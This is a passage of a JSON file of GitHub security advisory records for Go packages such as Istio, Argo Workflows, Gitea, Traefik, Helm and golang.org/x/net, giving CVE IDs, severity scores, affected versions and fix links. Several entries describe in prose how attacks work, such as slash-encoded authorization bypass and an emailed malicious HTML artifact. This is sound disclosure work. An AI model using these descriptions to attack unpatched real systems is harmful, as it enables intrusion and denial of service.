"http://www.openwall.com/lists/oss-security/2019/08/15/8"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:31:28Z", "nvd_published_at": "2019-11-05T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6q5m-22mq-q2xv", "modified": "2023-08-07T20:57:01Z", "published": "2022-05-24T19:03:32Z", "withdrawn": "2023-08-07T20:57:01Z", "aliases": ["CVE-2021-31920"], "summary": "Istio Authorization Bypass Vulnerability", "details": "Istio before 1.8.6 and 1.9.x before 1.9.5 has a remotely exploitable vulnerability where an HTTP request path with multiple slashes or escaped slash characters (%2F or %5C) could potentially bypass an Istio authorization policy when path based authorization rules are used.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.6"}]}]}, {"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.0"}, {"fixed": "1.9.5"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.9.4"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-31920"}, {"type": "WEB", "url": "https://istio.io/latest/news/security/istio-security-2021-005/"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-11T16:53:41Z", "nvd_published_at": "2021-05-27T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8vrw-m3j9-j27c", "modified": "2022-05-25T19:21:53Z", "published": "2022-05-25T19:21:53Z", "aliases": ["CVE-2020-35381"], "summary": "Denial of Service in jsonparser", "details": "jsonparser before 1.1.1 allows attackers to cause a denial of service via a GET call.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/buger/jsonparser"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-35381"}, {"type": "WEB", "url": "https://github.com/buger/jsonparser/issues/219"}, {"type": "WEB", "url": "https://github.com/buger/jsonparser/pull/221"}, {"type": "WEB", "url": "https://github.com/buger/jsonparser/commit/df3ea76ece10095374fd1c9a22a4fb85a44efc42"}, {"type": "PACKAGE", "url": "https://github.com/buger/jsonparser"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/27EA7OGCELV7QFAGVIHODHWKMKGFVIUZ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LJO5N7YTDEUSTKYTNA372CE6VHCZJWUG/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0057"}], "database_specific": {"cwe_ids": ["CWE-125"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-25T19:21:53Z", "nvd_published_at": "2020-12-15T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cmv8-6362-r5w9", "modified": "2022-05-23T20:16:05Z", "published": "2022-05-23T20:16:05Z", "aliases": ["CVE-2022-29164"], "summary": "Malicious HTML+XHR Artifact Privilege Escalation in Argo Workflows", "details": "Argo Workflows is an open source container-native workflow engine for orchestrating parallel jobs on Kubernetes.\n\n* The attacker creates a workflow that produces a HTML artifact that contains a HTML file that contains a script which uses XHR calls to interact with the Argo Server API.\n* The attacker emails the deep-link to the artifact to their victim. The victim opens the link, the script starts running.\n\nAs the script has access to the Argo Server API (as the victim), so may do the following (if the victim may):\n\n* Read information about the victim\u2019s workflows.\n* Create or delete workflows.\n\nNotes:\n\n* The attacker must be an insider: they must have access to the same cluster as the victim and must already be able to run their own workflows. \n* The attacker must have an understanding of the victim\u2019s system. They won\u2019t be able to repeatedly probe due to the social engineering  aspect.\n* The attacker is likely leave an audit trail.\n\nWe have seen no evidence of this in the wild. While the impact is high, it is very hard to exploit. \n\nWe urge all users to upgrade to the fixed versions. Disabling the Argo Server is the only known workaround. Note version 2.12 has been out of support for sometime. No fix is currently planned.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-workflows/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "3.2.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-workflows/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.3.0"}, {"fixed": "3.3.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-workflows/security/advisories/GHSA-cmv8-6362-r5w9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29164"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-workflows/pull/8585"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-workflows/commit/87470e1c2bf703a9110e97bb755614ce8757fdcc"}, {"type": "PACKAGE", "url": "github.com/argoproj/argo-workflows"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-23T20:16:05Z", "nvd_published_at": "2022-05-06T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fg3x-rwq9-74cw", "modified": "2023-07-25T19:19:22Z", "published": "2022-05-14T02:20:32Z", "aliases": ["CVE-2018-15192"], "summary": "Gogs and Gitea SSRF Vulnerability", "details": "An SSRF vulnerability in webhooks in Gitea through 1.5.0-rc2 and Gogs through 0.11.53 allows remote attackers to access intranet services.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.0-rc1"}]}]}, {"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-15192"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/issues/4624"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/5366"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/17482"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/pull/6002"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/commit/599ff1c054e436daa4dc3f049aa8661d9c2395f9"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/22717a1c064511cf37c46af5e650baf7184cf25b"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-25T19:19:22Z", "nvd_published_at": "2018-08-08T02:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2cjc-rgmp-x649", "modified": "2023-10-05T18:53:17Z", "published": "2022-05-13T01:07:40Z", "aliases": ["CVE-2018-15598"], "summary": "Traefik Missing Authentication", "details": "Containous Traefik 1.6.x before 1.6.6, when `--api` is used, exposes the configuration and secret if authentication is missing and the API's port is publicly reachable.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.6.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-15598"}, {"type": "WEB", "url": "https://github.com/containous/traefik/pull/3790"}, {"type": "WEB", "url": "https://github.com/containous/traefik/commit/113250ce5735d554c502ca16fb03bb9119ca79f1"}, {"type": "WEB", "url": "https://github.com/containous/traefik/commit/368bd170913078732bde58160f92f202f370278b"}, {"type": "PACKAGE", "url": "https://github.com/containous/traefik"}, {"type": "WEB", "url": "https://github.com/containous/traefik/releases/tag/v1.6.6"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-19T23:20:05Z", "nvd_published_at": "2018-08-21T01:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wjxw-gh3m-7pm5", "modified": "2022-06-07T14:30:11Z", "published": "2022-05-24T20:54:55Z", "aliases": ["CVE-2022-29177"], "summary": "DoS via malicious p2p message in Go Ethereum", "details": "### Impact\n\nA vulnerable node, if configured to use high verbosity logging, can be made to crash when handling specially crafted p2p messages sent from an attacker node. \n\n### Patches\n\nThe following PR addresses the problem: https://github.com/ethereum/go-ethereum/pull/24507\n\n### Workarounds\n\nAside from applying the PR linked above, setting loglevel to default level (`INFO`) makes the node not vulnerable to this attack.\n\n### Credits\n\nThis bug was reported by `nrv` via bounty@ethereum.org, who has gracefully requested that the bounty rewards be donated to M\u00e9decins sans fronti\u00e8res.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.17"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/security/advisories/GHSA-wjxw-gh3m-7pm5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29177"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/pull/24507"}, {"type": "PACKAGE", "url": "github.com/ethereum/go-ethereum"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-24T20:54:55Z", "nvd_published_at": "2022-05-20T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fcgg-rvwg-jv58", "modified": "2022-11-21T19:45:47Z", "published": "2022-05-26T00:01:27Z", "aliases": ["CVE-2022-30321"], "summary": "HashiCorp go-getter unsafe downloads", "details": "HashiCorp go-getter through 2.0.2 does not safely perform downloads. Protocol switching, endless redirect, and configuration bypass were possible via abuse of custom HTTP response header processing.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/s3/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/gcs/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-30321"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/pull/359"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/pull/361"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/commit/38e97387488f5439616be60874979433a12edb48"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/commit/a2ebce998f8d4105bd4b78d6c99a12803ad97a45"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-13-multiple-vulnerabilities-in-go-getter-library/39930"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/go-getter"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/releases"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0586"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-01T21:20:37Z", "nvd_published_at": "2022-05-25T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x3jr-pf6g-c48f", "modified": "2023-10-02T15:42:07Z", "published": "2022-05-24T16:46:15Z", "aliases": ["CVE-2019-11841"], "summary": "Golang/x/crypto message forgery vulnerability", "details": "A message-forgery issue was discovered in `crypto/openpgp/clearsign/clearsign.go` in supplementary Go cryptography libraries 2019-03-25. According to the OpenPGP Message Format specification in RFC 4880 chapter 7, a cleartext signed message can contain one or more optional \"Hash\" Armor Headers. The \"Hash\" Armor Header specifies the message digest algorithm(s) used for the signature. However, the Go clearsign package ignores the value of this header, which allows an attacker to spoof it. Consequently, an attacker can lead a victim to believe the signature was generated using a different message digest algorithm than what was actually used. Moreover, since the library skips Armor Header parsing in general, an attacker can not only embed arbitrary Armor Headers, but also prepend arbitrary text to cleartext messages without invalidating the signatures.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/crypto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20190424203555-c05e17bb3b2d"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11841"}, {"type": "WEB", "url": "https://github.com/golang/crypto/commit/c05e17bb3b2dca130fc919668a96b4bec9eb9442"}, {"type": "PACKAGE", "url": "https://github.com/golang/crypto/tree/master/openpgp/clearsign"}, {"type": "WEB", "url": "https://go-review.git.corp.google.com/c/crypto/+/173778"}, {"type": "WEB", "url": "https://go.googlesource.com/crypto/+/c05e17bb3b2dca130fc919668a96b4bec9eb9442"}, {"type": "WEB", "url": "https://groups.google.com/d/msg/golang-openpgp/6vdgZoTgbIY/K6bBY9z3DAAJ"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2019/09/msg00011.html"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/10/msg00014.html"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2023/06/msg00017.html"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1992"}, {"type": "WEB", "url": "https://web.archive.org/web/20201207161832/https://sec-consult.com/en/blog/advisories/cleartext-message-spoofing-in-go-cryptography-libraries-cve-2019-11841/"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/152840/Go-Cryptography-Libraries-Cleartext-Message-Spoofing.html"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-01T23:32:27Z", "nvd_published_at": "2019-05-22T17:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x6r5-vxfg-gq3v", "modified": "2023-08-01T23:17:41Z", "published": "2022-05-24T16:50:33Z", "aliases": ["CVE-2019-1010275"], "summary": "Helm Improper Certificate Validation", "details": "helm Before 2.7.2 is affected by: CWE-295: Improper Certificate Validation. The impact is: Unauthorized clients could connect to the server because self-signed client certs were aloowed. The component is: helm (many files updated, see https://github.com/helm/helm/pull/3152/files/1096813bf9a425e2aa4ac755b6c991b626dfab50). The attack vector is: A malicious client could connect to the server over the network. The fixed version is: 2.7.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.7.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-1010275"}, {"type": "WEB", "url": "https://github.com/helm/helm/pull/3152"}, {"type": "WEB", "url": "https://github.com/helm/helm/pull/3152/files/1096813bf9a425e2aa4ac755b6c991b626dfab50"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/1096813bf9a425e2aa4ac755b6c991b626dfab50"}, {"type": "WEB", "url": "https://github.com/helm/helm/releases/tag/v2.7.2"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-08-01T23:17:41Z", "nvd_published_at": "2019-07-17T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-39qc-96h7-956f", "modified": "2023-09-29T17:03:45Z", "published": "2022-05-24T16:53:19Z", "aliases": ["CVE-2019-9514"], "summary": "golang.org/x/net/http vulnerable to a reset flood", "details": "Some HTTP/2 implementations are vulnerable to a reset flood, potentially leading to a denial of service. Servers that accept direct connections from untrusted clients could be remotely made to allocate an unlimited amount of memory, until the program crashes. The attacker opens a number of streams and sends an invalid request over each stream that should solicit a stream of RST_STREAM frames from the peer. Depending on how the peer queues the RST_STREAM frames, this can consume excess memory, CPU, or both.\n\n### Specific Go Packages Affected\ngolang.org/x/net/http2", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20190813141303-74dc4d7220e7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-9514"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2594"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2661"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2682"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2690"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2726"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2766"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2769"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2796"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2861"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2925"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2939"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2955"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2966"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3131"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3245"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3265"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3892"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3906"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4018"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4019"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4020"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4021"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4040"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4041"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4042"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4045"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4269"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4273"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4352"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0406"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0727"}, {"type": "WEB", "url": "https://github.com/Netflix/security-bulletins/blob/master/advisories/third-party/2019-002.md"}, {"type": "WEB", "url": "https://go.dev/cl/190137"}, {"type": "WEB", "url": "https://go.dev/issue/33606"}, {"type": "WEB", "url": "https://go.googlesource.com/go/+/145e193131eb486077b66009beb051aba07c52a5"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/65QixT3tcmg/m/DrFiG6vvCwAJ"}, {"type": "WEB", "url": "https://kb.cert.org/vuls/id/605641/"}, {"type": "WEB", "url": "https://kc.mcafee.com/corporate/index?page=content&id=SB10296"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/392108390cef48af647a2e47b7fd5380e050e35ae8d1aa2030254c04@%3Cusers.trafficserver.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/ad3d01e767199c1aed8033bb6b3f5bf98c011c7c536f07a5d34b3c19@%3Cannounce.trafficserver.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/bde52309316ae798186d783a5e29f4ad1527f61c9219a289d0eee0a7@%3Cdev.trafficserver.apache.org%3E"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/12/msg00011.html"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4BBP27PZGSY6OP6D26E5FW4GZKBFHNU7/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4ZQGHE3WTYLYAYJEIDJVF2FIGQTAYPMC/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/CMNFX5MNYRWWIMO4BTKYQCGUDMHO3AXP/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYO6E3H34C346D2E443GLXK7OK6KIYIQ/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0536"}, {"type": "WEB", "url": "https://seclists.org/bugtraq/2019/Aug/24"}, {"type": "WEB", "url": "https://seclists.org/bugtraq/2019/Aug/31"}, {"type": "WEB", "url": "https://seclists.org/bugtraq/2019/Aug/43"}, {"type": "WEB", "url": "https://seclists.org/bugtraq/2019/Sep/18"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190823-0001/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190823-0004/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190823-0005/"}, {"type": "WEB", "url": "https://support.f5.com/csp/article/K01988340"}, {"type": "WEB", "url": "https://support.f5.com/csp/article/K01988340?utm_source=f5support&amp;utm_medium=RSS"}, {"type": "WEB", "url": "https://usn.ubuntu.com/4308-1/"}, {"type": "WEB", "url": "https://www.debian.org/security/2019/dsa-4503"}, {"type": "WEB", "url": "https://www.debian.org/security/2019/dsa-4508"}, {"type": "WEB", "url": "https://www.debian.org/security/2019/dsa-4520"}, {"type": "WEB", "url": "https://www.debian.org/security/2020/dsa-4669"}, {"type": "WEB", "url": "https://www.synology.com/security/advisory/Synology_SA_19_33"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00076.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00002.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00011.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00021.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00031.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00032.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00038.html"}, {"type": "WEB", "url": "http://seclists.org/fulldisclosure/2019/Aug/16"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2019/08/20/1"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/10/18/8"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:30:39Z", "nvd_published_at": "2019-08-13T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5rh7-6gfj-mc87", "modified": "2023-09-25T18:33:59Z", "published": "2022-05-24T16:50:40Z", "aliases": ["CVE-2019-1010261"], "summary": "Gitea XSS Vulnerability", "details": "Gitea 1.7.0 and earlier is affected by: Cross Site Scripting (XSS). The impact is: Attacker is able to have victim execute arbitrary JS in browser. The component is: go-get URL generation - PR to fix: https://github.com/go-gitea/gitea/pull/5905. The attack vector is: victim must open a specifically crafted URL. The fixed version is: 1.7.1 and later.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.7.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-1010261"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/5905"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-14T21:00:35Z", "nvd_published_at": "2019-07-18T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p3x5-5xpx-9phm", "modified": "2023-10-05T18:45:30Z", "published": "2022-05-24T17:06:10Z", "aliases": ["CVE-2018-1002104"], "summary": "Kubernetes ingress exposes sensitive information", "details": "Versions < 1.5 of the Kubernetes ingress default backend, which handles invalid ingress traffic, exposed prometheus metrics publicly.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/ingress-nginx"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1002104"}, {"type": "WEB", "url": "https://github.com/kubernetes/ingress-nginx/issues/1733"}, {"type": "WEB", "url": "https://github.com/kubernetes/ingress-nginx/pull/3125"}, {"type": "WEB", "url": "https://github.com/kubernetes/ingress-nginx/commit/d487a50e399100ad8db12ed1d2f92271f311f676"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/ingress-nginx"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-215"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-20T00:04:43Z", "nvd_published_at": "2020-01-14T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fx6x-h9g4-56f8", "modified": "2023-08-22T14:31:14Z", "published": "2022-05-24T17:19:02Z", "aliases": ["CVE-2020-10749"], "summary": "containernetworking/plugins vulnerable to MitM attacks", "details": "A vulnerability was found in all versions of containernetworking/plugins before version 0.8.6, that allows malicious containers in Kubernetes clusters to perform man-in-the-middle (MitM) attacks. A malicious container can exploit this flaw by sending rogue IPv6 router advertisements to the host or other containers, to redirect traffic to the malicious container.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containernetworking/plugins"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.8.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-10749"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-10749"}, {"type": "PACKAGE", "url": "https://github.com/containernetworking/plugins"}, {"type": "WEB", "url": "https://github.com/containernetworking/plugins/releases/tag/v0.8.6"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/kubernetes-security-announce/BMb_6ICCfp8"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DV3HCDZYUTPPVDUMTZXDKK6IUO3JMGJC/"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00063.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00065.html"}], "database_specific": {"cwe_ids": ["CWE-300"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-13T20:04:42Z", "nvd_published_at": "2020-06-03T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hhpm-74pm-hf35", "modified": "2023-08-22T14:35:45Z", "published": "2022-05-24T17:24:40Z", "aliases": ["CVE-2020-8553"], "summary": "ingress-nginx component for Kubernetes allows file 